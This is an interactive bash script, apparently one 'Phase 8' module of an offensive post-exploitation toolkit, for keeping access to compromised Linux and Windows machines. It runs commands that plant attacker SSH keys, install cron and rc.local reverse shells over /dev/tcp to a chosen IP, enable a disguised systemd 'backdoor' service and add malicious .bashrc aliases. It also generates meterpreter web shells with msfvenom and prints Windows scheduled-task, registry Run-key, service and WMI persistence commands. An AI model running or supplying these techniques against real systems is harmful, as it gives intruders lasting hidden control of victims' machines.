#!/bin/bash

#############################################################################
#                                                                           #
#  PERSISTENCE SUITE                                                       #
#  Phase 8: Maintain access across reboots and logouts                      #
#                                                                           #
#  Includes:                                                               #
#  - Backdoors                                                            #
#  - Scheduled tasks/jobs                                                  #
#  - Service installation                                                 #
#  - SSH keys                                                             #
#                                                                           #
#############################################################################

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo ""
    echo -e "${CYAN}─────── PERSISTENCE SUITE ───────"
    echo -e "─────── Phase 8: Maintain access across reboots/logouts ───────${NC}"
    echo ""
}

show_menu() {
    echo ""
    echo -e "${CYAN}─────── PERSISTENCE ───────"
    echo ""
    echo -e "${YELLOW}Linux Persistence${NC}"
    echo "   P1.  SSH Backdoor Keys"
    echo "   P2.  Cron Job Persistence"
    echo "   P3.  Systemd Service"
    echo "   P4.  rc.local Persistence"
    echo "   P5.  .bashrc Backdoor"
    echo ""
    echo -e "${YELLOW}Windows Persistence${NC}"
    echo "   PW1. Scheduled Task"
    echo "   PW2. Registry Run Keys"
    echo "   PW3. Service Installation"
    echo "   PW4. Startup Folder"
    echo "   PW5. WMI Event Subscription"
    echo ""
    echo -e "${YELLOW}Web Shells${NC}"
    echo "   PWS1. PHP Web Shell"
    echo "   PWS2. ASP Web Shell"
    echo "   PWS3. JSP Web Shell"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    P1                      SSH backdoor keys
    PW1                     Scheduled task (Windows)
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 P1
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift

    run_cmd() {
        local cmd="$1"
        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
        bash -c "$cmd"
    }

    case "$choice" in
        P1|p1)
            echo -e "${BLUE}[*] SSH Backdoor Keys${NC}"
            echo ""
            echo -n "[*] Enter public key (or press Enter to generate example): "
            read SSH_KEY
            echo ""
            if [[ -n "$SSH_KEY" ]]; then
                run_cmd "mkdir -p ~/.ssh"
                run_cmd "chmod 700 ~/.ssh"
                run_cmd "echo '${SSH_KEY}' >> ~/.ssh/authorized_keys"
                run_cmd "chmod 600 ~/.ssh/authorized_keys"
            else
                echo "[*] Example command:"
                echo "mkdir -p ~/.ssh"
                echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys"
            fi
            ;;
        P2|p2)
            echo -e "${BLUE}[*] Cron Job Persistence${NC}"
            echo ""
            echo -n "[*] Enter reverse shell IP: "
            read IP
            echo -n "[*] Enter port: "
            read PORT
            echo -n "[*] Enter command or path to backdoor: "
            read BACKDOOR
            echo ""
            if [[ -n "$IP" && -n "$PORT" ]]; then
                BACKDOOR=${BACKDOOR:-"/bin/bash -c '/bin/bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &'"}
                echo "[*] Adding cron job..."
                run_cmd "(crontab -l 2>/dev/null; echo '*/5 * * * * ${BACKDOOR}') | crontab -"
            else
                echo "[*] Example cron entries:"
                echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/${IP:-<IP>}/${PORT:-<PORT>} 0>&1 &'"
                echo "@reboot /path/to/backdoor"
            fi
            ;;
        P3|p3)
            echo -e "${BLUE}[*] Systemd Service Persistence${NC}"
            echo ""
            echo "[*] Creating systemd service..."
            echo -n "[*] Enter backdoor path: "
            read BACKDOOR
            echo ""
            if [[ -n "$BACKDOOR" ]]; then
                run_cmd "cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Service
After=network.target

[Service]
Type=oneshot
ExecStart=${BACKDOOR}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF"
                run_cmd "systemctl daemon-reload"
                run_cmd "systemctl enable backdoor.service"
                echo -e "${GREEN}[>] Service created and enabled${NC}"
            else
                echo "[*] Example service file path: /etc/systemd/system/backdoor.service"
            fi
            ;;
        P4|p4)
            echo -e "${BLUE}[*] rc.local Persistence${NC}"
            echo ""
            echo -n "[*] Enter reverse shell IP: "
            read IP
            echo -n "[*] Enter port: "
            read PORT
            echo ""
            if [[ -n "$IP" && -n "$PORT" ]]; then
                BACKDOOR="/bin/bash -c '/bin/bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &'"
                run_cmd "echo '${BACKDOOR}' >> /etc/rc.local"
                echo -e "${GREEN}[>] Added to /etc/rc.local${NC}"
            else
                echo "[*] Example entry in /etc/rc.local:"
                echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
            fi
            ;;
        P5|p5)
            echo -e "${BLUE}[*] .bashrc Backdoor${NC}"
            echo ""
            echo "[*] Adding aliases to .bashrc..."
            echo -n "[*] Enter malicious alias command: "
            read ALIAS_CMD
            echo ""
            if [[ -n "$ALIAS_CMD" ]]; then
                run_cmd "echo \"alias '${ALIAS_CMD}'\" >> ~/.bashrc"
            else
                echo "[*] Example malicious aliases:"
                echo "alias ssh='ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no'"
                echo "alias sudo='sudo -i'"
            fi
            ;;
        PW1)
            echo -e "${BLUE}[*] Windows Scheduled Task${NC}"
            echo ""
            echo -n "[*] Enter task name: "
            read TASK_NAME
            echo -n "[*] Enter backdoor path: "
            read BACKDOOR
            echo ""
            if [[ -n "$TASK_NAME" && -n "$BACKDOOR" ]]; then
                echo "[>] Creating scheduled task..."
                echo "schtasks /create /sc minute /mo 1 /tn \"${TASK_NAME}\" /tr \"${BACKDOOR}\" /f"
            else
                echo "[*] Example:"
                echo "schtasks /create /sc minute /mo 1 /tn \"Update\" /tr \"C:\\temp\\backdoor.exe\" /f"
            fi
            ;;
        PW2)
            echo -e "${BLUE}[*] Windows Registry Run Keys${NC}"
            echo ""
            echo -n "[*] Enter value name: "
            read VALUE_NAME
            echo -n "[*] Enter backdoor path: "
            read BACKDOOR
            echo ""
            if [[ -n "$VALUE_NAME" && -n "$BACKDOOR" ]]; then
                echo "[>] Adding registry run key..."
                echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"${VALUE_NAME}\" /t REG_SZ /d \"${BACKDOOR}\" /f"
            else
                echo "[*] Example:"
                echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyBackdoor\" /t REG_SZ /d \"C:\\temp\\backdoor.exe\" /f"
            fi
            ;;
        PW3)
            echo -e "${BLUE}[*] Windows Service Installation${NC}"
            echo ""
            echo -n "[*] Enter service name: "
            read SERVICE_NAME
            echo -n "[*] Enter backdoor path: "
            read BACKDOOR
            echo ""
            if [[ -n "$SERVICE_NAME" && -n "$BACKDOOR" ]]; then
                echo "[>] Creating service..."
                echo "sc create ${SERVICE_NAME} binPath= \"${BACKDOOR}\" start= auto"
                echo "sc start ${SERVICE_NAME}"
            else
                echo "[*] Example:"
                echo "sc create MyService binPath= \"C:\\temp\\backdoor.exe\" start= auto"
                echo "sc start MyService"
            fi
            ;;
        PW4)
            echo -e "${BLUE}[*] Windows Startup Folder${NC}"
            echo ""
            echo -n "[*] Enter backdoor path: "
            read BACKDOOR
            echo ""
            if [[ -n "$BACKDOOR" ]]; then
                echo "[>] Copying to startup folder..."
                echo "copy ${BACKDOOR} \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
            else
                echo "[*] Example:"
                echo "copy C:\\temp\\backdoor.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
            fi
            ;;
        PW5)
            echo -e "${BLUE}[*] WMI Event Subscription${NC}"
            echo ""
            echo "[*] WMI Event Subscription requires PowerShell scripting."
            echo "Example PowerShell command:"
            echo '$filter = "__EventFilter", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"notepad.exe\""'
            echo '$consumer = "CommandLineEventConsumer", @{CommandLineTemplate = "C:\\temp\\backdoor.exe"}'
            echo '$binding = "__FilterToConsumerBinding", @{Filter = $filter; Consumer = $consumer}'
            echo ""
            echo -n "[*] Press Enter to continue... "
            read
            ;;
        PWS1)
            echo -e "${BLUE}[*] PHP Web Shell Generator${NC}"
            echo ""
            echo -n "[*] Enter LHOST: "
            read LHOST
            echo -n "[*] Enter LPORT: "
            read LPORT
            echo ""
            if [[ -n "$LHOST" && -n "$LPORT" ]]; then
                if command -v msfvenom &>/dev/null; then
                    run_cmd "msfvenom -p php/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.php"
                    echo -e "${GREEN}[>] Web shell saved to: shell.php${NC}"
                else
                    echo -e "${YELLOW}[!] msfvenom not found${NC}"
                fi
            else
                echo "[*] Example:"
                echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.php"
            fi
            ;;
        PWS2)
            echo -e "${BLUE}[*] ASP Web Shell Generator${NC}"
            echo ""
            echo -n "[*] Enter LHOST: "
            read LHOST
            echo -n "[*] Enter LPORT: "
            read LPORT
            echo ""
            if [[ -n "$LHOST" && -n "$LPORT" ]]; then
                if command -v msfvenom &>/dev/null; then
                    run_cmd "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe > shell.aspx"
                    echo -e "${GREEN}[>] Web shell saved to: shell.aspx${NC}"
                else
                    echo -e "${YELLOW}[!] msfvenom not found${NC}"
                fi
            else
                echo "[*] Example:"
                echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.aspx"
            fi
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
